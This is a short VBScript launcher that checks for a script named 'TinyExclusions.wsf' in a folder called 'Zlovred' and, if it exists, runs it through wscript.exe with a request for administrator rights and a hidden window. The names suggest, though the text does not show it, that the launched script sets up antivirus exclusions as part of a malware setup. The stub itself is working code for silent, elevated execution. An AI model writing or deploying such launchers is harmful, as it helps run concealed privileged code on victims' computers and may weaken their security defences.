Dim threadFile1, local_Path, local_File1, strProgPath, envVarProccess, objFso, shApp
Set objFso = CreateObject("Scripting.FileSystemObject"):Set shApp = CreateObject( "Shell.Application" )
strProgPath = "C:\pub1\Distrib\Zlovred\"
threadFile1 = "TinyExclusions.wsf":local_File1 = strProgPath & threadFile1
if objFso.FileExists( local_File1 ) Then
	shApp.ShellExecute "c:\Windows\system32\wscript.exe", "//NoLogo " & Chr(34) & local_File1 & Chr(34), strProgPath, "runas", 0
end if
